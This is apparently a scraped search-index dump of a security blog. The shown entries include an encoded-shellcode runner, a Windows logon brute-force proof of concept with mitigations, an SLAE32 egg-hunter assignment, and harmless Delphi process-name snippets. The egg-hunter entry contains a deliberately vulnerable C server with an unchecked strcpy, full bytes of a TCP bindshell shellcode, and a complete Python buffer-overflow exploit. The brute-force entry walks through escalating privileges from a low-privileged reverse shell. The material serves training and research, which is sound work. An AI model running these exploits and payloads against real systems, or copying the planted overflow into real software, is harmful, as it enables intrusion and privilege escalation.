\u0026quot;\\xde\\xd0\\x59\\x34\\x42\\xf4\\xfc\\x67\\xee\\x65\\x3b\\xe6\\xea\\x40\\xcd\\x32\u0026quot; \u0026quot;\\x2c\\x53\\xde\\x6d\\x23\\xc5\\xcd\\xf6\\x7b\\x33\\x65\\xc5\\xc9\\x0b\\x3a\\x9c\u0026quot; \u0026quot;\\x5c\\x2e\\x9e\\x4f\\x44\\x99\\x54\\xc7\\x47\\x5d\\xb5\\x22\\xc3\\x31\\xce\\x4c\u0026quot; \u0026quot;\\xb3\\x52\\xad\\x5d\\x72\\x89\\xeb\\x5a\\x33\\x31\\x5f\\xdb\\xf4\\xfe\\x8d\\x44\u0026quot; \u0026quot;\\x2c\\xa8\\xe9\\x76\\x34\\x64\\x26\\x7e\\x3c\\x8c\\xce\\xbf\\xfc\\xfb\\xb8\\x72\u0026quot; \u0026quot;\\x31\\x21\\x62\u0026quot;; main() { printf(\u0026quot;Shellcode Length: %d\\n\u0026quot;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } local@user:$ gcc shellcode.c -o shellcode -z execstack \u0026amp;\u0026amp; ./shellcode\nAfterword Encoder is available in the following Github repository : https://github.com/DarkCoderSc/slae32-xor-encoder\n"});index.add({'id':10,'href':'/docs/windows/poc/bruteforce-windows-logon/','title':"Bruteforce Windows Logon (PoC)",'content':"Weakness Description Microsoft Windows suffer from a serious lack of protection in their authentication mechanism which could led in privilege escalation.\nIndeed, in default installation of Windows (all version), the account lockdown policy is disabled plus authentication API\u0026rsquo;s doesn\u0026rsquo;t limit number of attempts per seconds which could led to a medium to fast brute-force attacks.\nUsing our PoC and depending of the number of cores available in the target system you could test from few thousands to dozen of thousands of password per second.\nConsidering that those kind of authentication API\u0026rsquo;s could be used by any Windows account, even a Guest user could use the PoC to recover / crack the password of any local user and escalate his privilege.\nMitigation It is not sure that Microsoft will patch this problem. The best solution would be to implement account lockdown policy in all Microsoft Windows installations with a fine tuned threshold by default plus limiting the number of authentication API\u0026rsquo;s call per seconds.\nDisabled Guest Account If it is not absolutely necessary, disable the Guest account. By default, Guest account is not activated.\nImplement Lockdown Policy By default Lockdown Policy is not activated. If you have access to \u0026ldquo;Local Security Policy\u0026rdquo; application you can enable account lockdown easily.\nImport notice: Account lockdown policy wont affect Administrator user account. The only known mitigation for Administrator account if enabled is to use a complex password.  Enable Account Lockdown Policy Open \u0026ldquo;Local Security Policy\u0026rdquo; manager using secpol.msc command.\nThen browse to Security Settings \u0026gt; Account Policies \u0026gt; Account Lockout Policy\nFinally double click on Account lockout threshold item and set the Account will lock out after spin edit with desired value from (1 to 999).\nIn Windows Home edition you might not found the secpol.msc management console. You can access to security settings through gpedit.msc and Local Computer Policy \u0026gt; Computer Configuration \u0026gt; Windows Settings \u0026gt; Security Settings \u0026gt; Account Policy \u0026gt; Account Lockout Policy.\n Use complex password This is the most important thing to take in consideration and the best way to mitiage this problem.\nUsing a complex password will prevent brute-forcing attacks to succeed. Follow guidelines about how to create a tough password.\nPoC Source Code (32bit and 64bit) The full Proof Of Concept code is available on Github : https://github.com/DarkCoderSc/win-brute-logon\ngit clone https://github.com/DarkCoderSc/win-brute-logon.git\nIt was build with Delphi 10.3 Rio. (No additional libraries or dependencies are required)\nUsage  -u : Target username (Required). -w : Wordlist file (Required). -d : Specify domain name (Default : %USERDOMAIN% environment variable). -v : Enable verbosity.  Example: WinBruteLogon.exe -u \u0026quot;Jean-Pierre LESUEUR\u0026quot; -w \u0026quot;c:\\tmp\\test.txt\u0026quot; -v\nResult Scenario N°1 Lets imagine an Hacker having an existing reverse shell to a remote Windows machine as a low privileged user (Guest account in our example, but it could be another user).\nFortunately for him account policy lockdown is not enabled and target user HackMe might have been lazy and chose a password present in a wordlist.\nFrom his Netcat session and using WinBruteLogon, the Hacker could easily find the password of target account HackMe and escalate his privileges using another tool (in our case, RunAsAttached.exe). Still from his Netcat session he would be now logged as user HackMe and continue his path with his desired objectives.\nYou can find both application on our Github page:\n WinBruteLogon : https://github.com/DarkCoderSc/win-brute-logon RunAsAttached : https://github.com/DarkCoderSc/run-as-attached-local  Scenario in Video   Scenario N°2 In this scenario account policy lockdown is enabled and configured to lock account after 10 failed attempt. We are likely protected against brute-force attack using WinBruteLogon.exe.\nBut what if Administrator account is used and enabled?\nAdministrator account isn\u0026rsquo;t concerned by the account lockdown policy, if an Hacker enter as a low privileged user and if Administrator account password is weak or present in a dictionary, the Hacker could still brute-force the account and escalate his privilege.\nUsing a complex password is THE mitigation for such attack. In this specific case account lockdown policy would be useless.  Scenario in Video   Conclusion in three points   Ensure to use complex password for all your user and ensure that account lockdown policy is enabled.\n  Be careful while testing this attack, it will surely be very noisy.\n  Be sure to have all required authorization.\n  "});index.add({'id':11,'href':'/docs/windows/','title':"Microsoft Windows",'content':""});index.add({'id':12,'href':'/docs/windows/poc/','title':"PoC",'content':"Proof Of Concepts (PoC) Sections   Bruteforce Windows Logon via LogonUser WinAPI  "});index.add({'id':13,'href':'/docs/linux/slae32/ex3-egghunter/','title':"Assignment N°3 - Egg Hunter (C)",'content':"Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.\nIf you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.\nWhy? the goal of that certification is to practice and learn how to solve each assignment by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.\nStudent ID: SLAE-1530\n   Study about the Egg Hunter shellcode.\n  Create a working demo of the Egghunter.\n  Should be configurable for different payloads.\n  What is an Egg Hunter Shellcode ? Egg Hunting is a technique which is part of shellcoding and binary exploitation.\nIt is recommended to have a minimum knowledge about classic binary exploitation techniques and shellcoding to understand the whole concept.\nIt is also recommended to have solid basis about C programming in order to understand all demo codes in this paper.\n An egg hunter is a very small piece of shellcode designed to find another shellcode in memory (usually a bigger one). To do so, it scans the whole process memory in search of a special pattern. This pattern is called an egg and is preceded from the the second and bigger shellcode. When an egg is found in memory, the egg hunter shellcode will redirect execution flow to the second one.\nAn egg is composed of 4 bytes (the size of a memory address in x86-32 processors) for example 0x44434241 (ABCD Little Endian). We generally repeat the egg once to avoid \u0026ldquo;collisions\u0026rdquo;.\nImagine if we choose ABCD as our egg, ABCD is a common string and we could find this pattern at multiple memory location but ABCDABCD less likely.\nABCD is not a good choice anyway since it is too common, even if we repeat it. It is important to choose something you don\u0026rsquo;t often see in programs and memory, for example egg! or 3gg!.\nThroughout this paper we will use egg! (0x21676765) as the value of our egg, feel free to chose yours and adapt each pieces of code and commands.  When the egg hunter shellcode find the correct memory offset for second stage, it redirect execution flow to second shellcode. The offset (memory address) of the second shellcode is usually the offset of the egg location +8 bytes. (2x egg size).\nWe often use egg hunting technique when we lack of space for our real shellcode.\nImagine a TCP Bind Shell shellcode with a size of 150 bytes but the vulnerable program only have 60 bytes available for its buffer space. We would first write somewhere else in memory the bigger shellcode (our egg in addition of the TCP Bind Shell), then we would exploit the vulnerable buffer in executing our egg hunter shellcode to find and redirect execution flow to the TCP Bind Shell.\nUnderstanding Egg Hunters The best way to understand how egg hunters works is to create deliberately a vulnerable application.\nWe will use our TCP Bindshell shellcode (~224 Bytes) as final payload. 224 Bytes is quite huge for a shellcode, it is perfect to demonstrate the real use of egg hunters.\nWe will create a tiny server application with at least two methods, each method represent a stage during our exploitation, respectively:\nFirst method (first stage) will create a child thread (with its own stack) and allow a client to store up to 1024 bytes in its stack. Imagine this method like something perfectly harmless to cache some data in memory before doing additional actions. This is the perfect location to store our TCP Bindshell shellcode.\nSecond method (second stage) will create another child thread and allow a client to store a string in an uncontrolled buffer. This method will be deliberately vulnerable to buffer overflow attack. This is where we will write and execute our egg hunter shellcode. When executed our egg hunter will attempt to locate the pattern of our second payload and redirect execution flow.\nFinally for safety reasons, our server application will only listen for localhost clients.\nVulnerable Server Application (C) /* Jean-Pierre LESUEUR (@DarkCoderSc) jplesueur@phrozen.io https://www.phrozen.io/ https://github.com/darkcodersc License : MIT --- SLAE32 Assignment 3 : Linux x86-32 Egg Hunter Research. --- gcc egg-reallife.c -o egg-reallife -z execstack -no-pie -fno-stack-protector -pthread Warning: This C program is willingly vulnerable to buffer overflow which could led to remote code execution. (!) Do not copy paste pieace of code without real caution (!) */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; /**************************************************************************************************** Server Thread Child Thread: Egg Host (cmd=1) for phase n°1. In our scenario this would be phase n°1. Imagine CacheMe() as a perfectly secured function to cache some data in memory. We have can cache up to 1KiB of data per thread. Far sufficient to host our real shellcode payload. ****************************************************************************************************/ void *CacheMe(void *param) { int client = (int)param; char buffer[1024]; // Buffer that will contain our future egg + shellcod // Waiting for data from client. int result = recv(client, buffer, sizeof(buffer), 0); if (result \u0026lt;= 0) { printf(\u0026quot;Could not receive data from client.\\n\u0026quot;); } else printf(\u0026quot;Buffer successfully filled with %d bytes of data.\\n\u0026quot;, result);\t/// close(client); } /**************************************************************************************************** Server Thread Child Thread: Buffer Overflow Location (cmd=2) for phase n°2. In our scenario this would be phase n°2. Image ExploitMe() as a function vulnerable to buffer overflow but with a small buffer. However it is sufficient to place our egg hunter shellcode here to locate our second and real shellcode payload. ****************************************************************************************************/ void *ExploitMe(void *param) { char feedback[60]; char buffer[200]; /// int client = (int)param; int result = recv(client, buffer, sizeof(buffer), 0); printf(\u0026quot;Received %d bytes for feedback.\u0026quot;); strcpy(feedback, buffer); // who cares about security? :-P } /**************************************************************************************************** Server Thread This server accept two commands: 1. Cache some data in child thread stack (memory). 2. Write data to an uncontrolled buffer (In our scenario, a fake rating system). ****************************************************************************************************/ void *Server() { printf(\u0026quot;Server thread has started.\\n\u0026quot;); /* Create a new socket */ int s = socket(AF_INET, SOCK_STREAM, 0); if (s == 0) { printf(\u0026quot;Could not create socket\u0026quot;);\tpthread_exit(NULL); } printf(\u0026quot;Socket created with handle:%d\\n\u0026quot;, s); /* Avoid error already in use. */ int optval = 1; int result = setsockopt(s, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, \u0026amp;optval, sizeof(int)); if (result == -1) { printf(\u0026quot;Could not call setsockopt().\u0026quot;); close(s); pthread_exit(NULL); } /* Bind socket to port. */ struct sockaddr_in saddr_in; saddr_in.sin_family = AF_INET; saddr_in.sin_port = htons(1403); // Listening on port 1403. saddr_in.sin_addr.s_addr = 16777343; // Listenning on address 127.0.0.1. result = bind(s, (struct sockaddr*)\u0026amp;saddr_in, sizeof(struct sockaddr_in)); if (result == -1) { printf(\u0026quot;Could not bind socket.\\n\u0026quot;); close(s); pthread_exit(NULL); } printf(\u0026quot;Socket successfully binded.\\n\u0026quot;); /* Start listening */ result = listen(s, 5); if (result == -1) { printf(\u0026quot;Could not listen.\\n\u0026quot;); close(s); pthread_exit(NULL); } printf(\u0026quot;Listening...\\n\u0026quot;); /* Wait for new clients to connect. */\tfor (;;) { int client = accept(s, NULL, NULL); /// if (client \u0026lt; 0) break; printf(\u0026quot;New client connected our server with handle: %d\\n\u0026quot;, client); char cmd[1];\tresult = recv(client, cmd, sizeof(cmd), 0); if (result \u0026lt;= 0) continue;\tif (!isdigit(*cmd)) { printf(\u0026quot;Bad command format.\\n\u0026quot;); continue; } int icmd = atoi(cmd); printf(\u0026quot;command=[%d]\\n\u0026quot;, icmd); pthread_t thread;\tswitch(icmd) { case 1: pthread_create(\u0026amp;thread, NULL, CacheMe, (void *)client); break; case 2: pthread_create(\u0026amp;thread, NULL, ExploitMe, (void *)client); break; default: close(client); }\t} close(s); /// pthread_exit(NULL); } /**************************************************************************************************** Program Entry Point ****************************************************************************************************/ void main() { pthread_t thread; pthread_create(\u0026amp;thread, NULL, Server, NULL); // Create a new thread. pthread_join(thread, NULL); // Wait for thread to finish his task.\treturn; } We can compile and execute our server using bellow commands:\nlocal@user# gcc egg-reallife.c -o egg-reallife -z execstack -no-pie -fno-stack-protector -pthread\nlocal@user# sudo ./egg-reallife\nBe sure ASLR is disabled on machine that host the vulnerable server.\nTCP Bindshell shellcode require root privilege to bind on port 443. We must run our server as root.\n By default, it will listen for incomming clients on port 1403, feel free to use your favorite port number.\n16777343 is the translation of 127.0.0.1 and should not be changed.\nWriting our exploit (Python) At this point, you should have your own vulnerable server running and waiting for commands.\nWe will now focus on our exploit script.\nWe chose egg! as our egg pattern, feel free to use your own one but don\u0026rsquo;t forget to update exploit code consequently.  Generate an Egg Hunter using msf-egghunter This step requires Metasploit Framework which comes with msg-egghunter.\nWe can create our Egg Hunter shellcode using the following command:\nlocal@user# msf-egghunter -f python -e egg! -v egg_hunter -p linux -a x86\nOption -v is used to name our python variable that host the shellcode.\nResult egg_hunter = b\u0026quot;\u0026quot; egg_hunter += b\u0026quot;\\xfc\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\u0026quot; egg_hunter += b\u0026quot;\\x80\\x3c\\xf2\\x74\\xf1\\xb8\\x65\\x67\\x67\\x21\\x89\u0026quot; egg_hunter += b\u0026quot;\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7\u0026quot; Prepare our Shellcode (TCP Bindshell) Remember, we must write two times our egg pattern before the shellcode itself.\nOur pattern egg! encoded in hex (Little Endian) equal to \\x65\\x67\\x67\\x21\nResult # Prefixed by our egg token \u0026quot;egg!egg!\u0026quot;. shellcode = b\u0026quot;\u0026quot; shellcode += b\u0026quot;\\x65\\x67\\x67\\x21\u0026quot; # egg! shellcode += b\u0026quot;\\x65\\x67\\x67\\x21\u0026quot; # egg! # Shellcode payload (TCP Bindshell port 443) shellcode += b\u0026quot;\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x31\\xc9\\xb1\\x1e\\x50\\xe2\u0026quot; shellcode += b\u0026quot;\\xfd\\x89\\xec\\xb3\\x01\\xc6\\x44\\x24\\xf8\\x01\\xc6\\x44\\x24\\xf4\\x02\\x83\u0026quot; shellcode += b\u0026quot;\\xec\\x0c\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x80\\xc3\\x0d\\xc6\u0026quot; shellcode += b\u0026quot;\\x44\\x24\\xfc\\x04\\x83\\xec\\x04\\x89\\x64\\x24\\xfc\\xc6\\x44\\x24\\xf8\\x02\u0026quot; shellcode += b\u0026quot;\\xc6\\x44\\x24\\xf4\\x01\\x89\\x74\\x24\\xf0\\x83\\xec\\x10\\x89\\xe1\\xb0\\x66\u0026quot; shellcode += b\u0026quot;\\xcd\\x80\\x31\\xc0\\x80\\xeb\\x0c\\xb0\\x01\\xb4\\xbb\\x66\\x89\\x44\\x24\\xf2\u0026quot; shellcode += b\u0026quot;\\xc6\\x44\\x24\\xf0\\x02\\x31\\xc0\\xb0\\x10\\x29\\xc4\\xc6\\x44\\x24\\xfc\\x10\u0026quot; shellcode += b\u0026quot;\\x89\\x64\\x24\\xf8\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\x31\\xc0\\xb0\u0026quot; shellcode += b\u0026quot;\\x66\\xcd\\x80\\x80\\xc3\\x02\\x89\\x74\\x24\\xf8\\x83\\xec\\x08\\x89\\xe1\\xb0\u0026quot; shellcode += b\u0026quot;\\x66\\xcd\\x80\\xfe\\xc3\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\xb0\\x66\u0026quot; shellcode += b\u0026quot;\\xcd\\x80\\x89\\xc3\\x31\\xc9\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\xfe\\xc1\\x80\\xf9\u0026quot; shellcode += b\u0026quot;\\x02\\x7e\\xf3\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xc7\\x44\\x24\\xf8\\x2f\\x2f\\x73\u0026quot; shellcode += b\u0026quot;\\x68\\xc7\\x44\\x24\\xf4\\x2f\\x62\\x69\\x6e\\x83\\xec\\x0c\\x89\\xe3\\x83\\xec\u0026quot; shellcode += b\u0026quot;\\x04\\x89\\xe2\\x89\\x5c\\x24\\xfc\\x83\\xec\\x04\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026quot; Write our TCP Bindshell shellcode to target process memory. After opening a new connection to target process, we will send our TCP Bindshell shellcode (shellcode variable) using command N°1 \\x31.\nThis will place our shellcode somewhere in target process memory.\nExploiting Buffer Overflow This part is not covered in detail, we consider your are already familiar with exploiting buffer overflows.  Required steps (with help of GDB) are:\n Find EIP offset. Confirm if we control EIP. Find possible bad chars (Not required in this case). Find max size for our payload. Create our payload. NOP sled + Egg Hunter shellcode. Identify a stack address that point in the middle of our NOP sled. Overwrite EIP with this stack address.  When final payload is ready we will open a new connection to target process, this time with command N°2 \\x32. This will exploit the buffer overflow and execute our Egg Hunter shellcode, after few seconds our TCP Bindshell should be available on port 443.\nFinal Code #!/usr/bin/python3 ''' Jean-Pierre LESUEUR (@DarkCoderSc) jplesueur@phrozen.io https://www.phrozen.io/ https://github.com/darkcodersc License : MIT --- SLAE32 Assignment 3 : Linux x86-32 Egg Hunter Research. --- Description: This is the full working (LOCAL) exploit code for egg-reallife.c program to demonstrate our egg hunter is applied to real life situation. ''' from socket import * import sys import time import struct # # Log Defs # def success(message): print(\u0026quot;[\\033[32m+\\033[39m] \u0026quot; + message) def fail(message): print(\u0026quot;[\\033[31mx\\033[39m] \u0026quot; + message) def warn(message): print(\u0026quot;[\\033[34m!\\033[39m] \u0026quot; + message) def info(message): print(\u0026quot;[\\033[34m*\\033[39m] \u0026quot; + message) # # Payload 1 : cat /etc/passwd. # # Prefixed by our egg token \u0026quot;egg!egg!\u0026quot;. shellcode = b\u0026quot;\u0026quot; shellcode += b\u0026quot;\\x65\\x67\\x67\\x21\u0026quot; # egg! shellcode += b\u0026quot;\\x65\\x67\\x67\\x21\u0026quot; # egg! # Shellcode payload (TCP Bindshell port 443) shellcode += b\u0026quot;\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x31\\xc9\\xb1\\x1e\\x50\\xe2\u0026quot; shellcode += b\u0026quot;\\xfd\\x89\\xec\\xb3\\x01\\xc6\\x44\\x24\\xf8\\x01\\xc6\\x44\\x24\\xf4\\x02\\x83\u0026quot; shellcode += b\u0026quot;\\xec\\x0c\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x80\\xc3\\x0d\\xc6\u0026quot; shellcode += b\u0026quot;\\x44\\x24\\xfc\\x04\\x83\\xec\\x04\\x89\\x64\\x24\\xfc\\xc6\\x44\\x24\\xf8\\x02\u0026quot; shellcode += b\u0026quot;\\xc6\\x44\\x24\\xf4\\x01\\x89\\x74\\x24\\xf0\\x83\\xec\\x10\\x89\\xe1\\xb0\\x66\u0026quot; shellcode += b\u0026quot;\\xcd\\x80\\x31\\xc0\\x80\\xeb\\x0c\\xb0\\x01\\xb4\\xbb\\x66\\x89\\x44\\x24\\xf2\u0026quot; shellcode += b\u0026quot;\\xc6\\x44\\x24\\xf0\\x02\\x31\\xc0\\xb0\\x10\\x29\\xc4\\xc6\\x44\\x24\\xfc\\x10\u0026quot; shellcode += b\u0026quot;\\x89\\x64\\x24\\xf8\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\x31\\xc0\\xb0\u0026quot; shellcode += b\u0026quot;\\x66\\xcd\\x80\\x80\\xc3\\x02\\x89\\x74\\x24\\xf8\\x83\\xec\\x08\\x89\\xe1\\xb0\u0026quot; shellcode += b\u0026quot;\\x66\\xcd\\x80\\xfe\\xc3\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\xb0\\x66\u0026quot; shellcode += b\u0026quot;\\xcd\\x80\\x89\\xc3\\x31\\xc9\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\xfe\\xc1\\x80\\xf9\u0026quot; shellcode += b\u0026quot;\\x02\\x7e\\xf3\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xc7\\x44\\x24\\xf8\\x2f\\x2f\\x73\u0026quot; shellcode += b\u0026quot;\\x68\\xc7\\x44\\x24\\xf4\\x2f\\x62\\x69\\x6e\\x83\\xec\\x0c\\x89\\xe3\\x83\\xec\u0026quot; shellcode += b\u0026quot;\\x04\\x89\\xe2\\x89\\x5c\\x24\\xfc\\x83\\xec\\x04\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026quot; # # Payload 2 : Egg Hunter. # Generated with msf-egghunter -f python -e egg! -v egg_hunter -p linux -a x86 # egg_hunter = b\u0026quot;\u0026quot; egg_hunter += b\u0026quot;\\xfc\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\u0026quot; egg_hunter += b\u0026quot;\\x80\\x3c\\xf2\\x74\\xf1\\xb8\\x65\\x67\\x67\\x21\\x89\u0026quot; egg_hunter += b\u0026quot;\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7\u0026quot; # # Networking Function # def SubmitPhasePayload(cmd, payload): s = socket(AF_INET, SOCK_STREAM) if (s.connect_ex((LHOST, LPORT)) == 0): success(f\u0026quot;Successfully connected to {LHOST}:{LPORT}.\u0026quot;); # Send command n°1 (cache data in memory) info(f\u0026quot;Send command = {cmd}\u0026quot;); s.send(cmd); info(\u0026quot;Wait 2 seconds...\u0026quot;); time.sleep(2); info(\u0026quot;Send payload stage.\u0026quot;); s.send(payload); success(\u0026quot;Payload successfully sent.\u0026quot;) s.close(); # Gracefully close connection.\treturn True else: fail(f\u0026quot;Could not connect to {LHOST}:{LPORT}\u0026quot;);\treturn False # # Exploitation # LHOST = \u0026quot;127.0.0.1\u0026quot; LPORT = 1403 info(\u0026quot;Phase n°1: Sending shellcode to target server memory.\u0026quot;) if (SubmitPhasePayload(b\u0026quot;\\x31\u0026quot;, shellcode)): success(\u0026quot;Phase n°1 : Success.\u0026quot;) info(\u0026quot;Phase n°2: Exploiting buffer overflow and sending egg hunter shellcode.\u0026quot;) # # Create buffer overflow payload. # payload = b\u0026quot;\u0026quot; # (+): Locate EIP Offset. # pattern_create.rb -l 250 #payload += \u0026quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0\u0026quot;.encode('ascii') #payload += \u0026quot;Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1A\u0026quot;.encode('ascii') #payload += \u0026quot;e2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3\u0026quot;.encode('ascii') #payload += \u0026quot;Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A\u0026quot;.encode('ascii') # (+): Result = pattern_offset.rb -q \u0026quot;6Ac7\u0026quot;(offset=80) eip_offset = 80 # (+): Test if we control EIP. #payload += b\u0026quot;\\x41\u0026quot; * eip_offset #payload += b\u0026quot;\\x42\u0026quot; * 4 # (+): Yes we did. 0x42424242 is in EIP. # (+): Place and execute our egghunter shellcode. nop_sled_size = (eip_offset - len(egg_hunter)) payload += b\u0026quot;\\x90\u0026quot; * nop_sled_size # NOP Sled. payload += egg_hunter # Our egghunter shellcode goes here. payload += b\u0026quot;\\x1c\\xe3\\xbf\\xb6\u0026quot; # Stack address, ASLR must of course be disabled! Little Endian. # (+): If correctly configured, shellcode should get triggered. if (SubmitPhasePayload(b\u0026quot;\\x32\u0026quot;, payload)): success(\u0026quot;Phase n°2 : Success.\u0026quot;); info(\u0026quot;Please wait few seconds until egghunter shellcode trigger the other one...\u0026quot;); else: fail(\u0026quot;Phase n°2 : Failed.\u0026quot;) else: fail(\u0026quot;Phase n°1 : Failed.\u0026quot;) Test Me user@local# chmod +x exploit.py \u0026amp;\u0026amp; ./exploit.py\nResult Afterword Code files are available in the following Github repository:\nhttps://github.com/DarkCoderSc/slae32-egghunters\nBonus In bonus you will find two additional applications to understand more deeply how egg hunters works using C programming language.\nBonus 1 : Egg Hunter Principle applied to C (No Code Execution). This program demonstrate how to retrieve data from memory using access() memory scanning method. access() is probably the most famous and used technique for creating efficient Egg Hunters.\nYou will find the full code at this address : https://github.com/DarkCoderSc/slae32-egghunters/blob/master/egg-principle.c\nAccess Memory Scanning in C _Bool egg_hunt(unsigned int *ptr, char *egg_name, _Bool access_chk) { _Bool access_violation = 0; if (access_chk) { access_violation = ((access((char *) ptr, F_OK) == -1) \u0026amp;\u0026amp; (errno == EFAULT)); } if (!access_violation) { char addr[9]; snprintf(addr, sizeof(addr), \u0026quot;%08x\u0026quot;, *ptr); if (strcmp(addr, egg_name) == 0) {\treturn 1; } } /// return 0; } unsigned int egg_hunter() { unsigned int max_page = (pow(2, 32) / page_size); unsigned int page_cursor = 0; unsigned int mem_cursor = 0;\t_Bool found = 0; for (unsigned int i = 0; i \u0026lt; max_page; i++) { page_cursor = (i * page_size); /// if ((access((char *) page_cursor, F_OK) == -1) \u0026amp;\u0026amp; (errno == EFAULT)) { continue; } else {\tfor (unsigned int n = 0; n \u0026lt; (page_size -3); n++) { mem_cursor = (page_cursor + n); /// unsigned int *ptr = (unsigned int *) mem_cursor; if (egg_hunt(ptr, egg, 0)) {\tptr++; /// if (egg_hunt(ptr, egg, 1)) { ptr++; ///\treturn (unsigned int) ptr;\t} } } } } /// return 0; } Bonus 2 : Egg Hunter Principle applied to C (Code Execution). This time, instead of just retrieving data from memory, when our scanner find the Egg pattern in memory it will redirect execution flow to it address.\nThe shellcode used in this program will print content of /etc/passwd file.\nYou will find the full code at this address : https://github.com/DarkCoderSc/slae32-egghunters/blob/master/egg-shellcode-embedded.c\n"});index.add({'id':14,'href':'/docs/windows/snippets/delphi/','title':"Delphi",'content':"Delphi Section   Get Registry Key ACL Security Descriptor Get Process Name Method 4 : GetProcessImageFileName Get Process Name Method 3 : NtQueryInformationProcess Get Process Name Method 2 : GetMappedFilename Enum Attached Files Get DLL Exported Function Address From Memory Get DLL Exported Function Address GetProcAddress API Alternative Enum DLL Exported Functions Get Process Name Method 1 Enum Modules Method 1 Terminate Process Techniques Update PEB Debug Flag Enum Process Method 1 Is Process 64bit Manipulation and Detection of EOF  "});index.add({'id':15,'href':'/docs/windows/snippets/delphi/get-process-name-method-4-getprocessimagefilename/','title':"Get Process Name Method 4 GetProcessImageFileName",'content':"This time we will use a quite well known API to get the full process image path GetProcessImageFileName documented here.\nNothing very complex and this technique works from 32bit to 64bit / 64bit to 32bit processes.\n// Jean-Pierre LESUEUR (@DarkCoderSc) function PhysicalToVirtualPath(APath : String) : String; var i : integer; ADrive : String; ABuffer : array[0..MAX_PATH-1] of Char; ACandidate : String; begin {$I-} for I := 0 to 25 do begin ADrive := Format('%s:', [Chr(Ord('A') + i)]); /// if (QueryDosDevice(PWideChar(ADrive), ABuffer, MAX_PATH) = 0) then continue; ACandidate := String(ABuffer).ToLower(); if String(Copy(APath, 1, Length(ACandidate))).ToLower() = ACandidate then begin Delete(APath, 1, Length(ACandidate)); result := Format('%s%s', [ADrive, APath]); end; end; {$I+} end; function GetProcessImagePath(const AProcessId : Cardinal) : String; // https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getprocessimagefilenamew var _GetProcessImageFileNameW : function( hProcess : THandle; lpImageFileName : LPWSTR; nSize : DWORD ) : DWORD; stdcall; hPsAPI : THandle; hProc : THandle; ALength : Cardinal; AImagePath : String; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; begin result := ''; /// hProc := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, AProcessId); if (hProc = 0) then Exit(); try hPsAPI := LoadLibrary('psapi.dll'); if (hPsAPI = 0) then Exit(); try @_GetProcessImageFileNameW := GetProcAddress(hPsAPI, 'GetProcessImageFileNameW'); if NOT Assigned(_GetProcessImageFileNameW) then Exit(); /// SetLength(AImagePath, MAX_PATH); ALength := _GetProcessImageFileNameW(hProc, @AImagePath[1], MAX_PATH); if (ALength \u0026gt; 0) then begin SetLength(AImagePath, ALength); /// result := PhysicalToVirtualPath(AImagePath); end; finally FreeLibrary(hPsAPI); end; finally CloseHandle(hProc); end; end; I have few other methods in mind, I will post them in a near future so stay tuned :)\n"});index.add({'id':16,'href':'/docs/windows/snippets/delphi/get-process-name-method-3-ntqueryinformationprocess/','title':"Get Process Name Method 3 NtQueryInformationProcess",'content':"Yet another technique to get the full image path of a target process using the NtQueryInformationProcess API documented Here\nThis technique from 32bit to 64bit / 64bit to 32bit.\n// Jean-Pierre LESUEUR (@DarkCoderSc) function PhysicalToVirtualPath(APath : String) : String; var i : integer; ADrive : String; ABuffer : array[0..MAX_PATH-1] of Char; ACandidate : String; begin {$I-} for I := 0 to 25 do begin ADrive := Format('%s:', [Chr(Ord('A') + i)]); /// if (QueryDosDevice(PWideChar(ADrive), ABuffer, MAX_PATH) = 0) then continue; ACandidate := String(ABuffer).ToLower(); if String(Copy(APath, 1, Length(ACandidate))).ToLower() = ACandidate then begin Delete(APath, 1, Length(ACandidate)); result := Format('%s%s', [ADrive, APath]); end; end; {$I+} end; function GetProcessImagePath(const AProcessId : Cardinal) : String; type PUnicodeString = ^TUnicodeString; TUnicodeString = record Length : USHORT; MaximumLength : USHORT; Buffer : PWideChar; end; // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess var 